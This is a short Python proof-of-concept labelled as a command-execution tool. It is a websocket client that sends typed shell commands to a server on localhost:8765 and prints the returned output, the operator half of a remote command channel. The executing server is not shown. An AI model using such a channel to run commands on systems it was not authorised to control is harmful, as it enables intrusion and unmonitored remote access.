#!/usr/bin/env python
# Command execution PoC 
# ZephrFIsh

import asyncio
import websockets

async def sendCMDs():
    uri = "ws://localhost:8765"
    cmd = ''
    while cmd != 'exit':
        async with websockets.connect(uri) as websocket:
            cmd = input("Enter Command To Run: ")
            await websocket.send(cmd)
            print(f"Sending {cmd}")
            cmd_output = await websocket.recv()
            await websocket.send(cmd_output)
            
            print("Output from Command: ")
            print(f"Received: {cmd_output}")
    else:
        exit()
       

asyncio.get_event_loop().run_until_complete(sendCMDs())